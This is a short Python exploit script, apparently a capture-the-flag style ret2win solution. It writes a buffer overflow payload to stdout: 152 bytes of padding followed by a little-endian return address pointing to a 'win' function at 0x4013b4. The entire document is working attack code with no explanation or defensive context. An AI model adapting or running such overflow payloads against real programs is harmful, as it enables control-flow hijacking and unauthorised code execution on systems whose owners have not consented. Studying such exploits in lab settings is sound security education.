import sys

WIN_ADDR = 0x4013b4
payload = b"A" * 152 + WIN_ADDR.to_bytes(8, "little")
sys.stdout.buffer.write(payload)
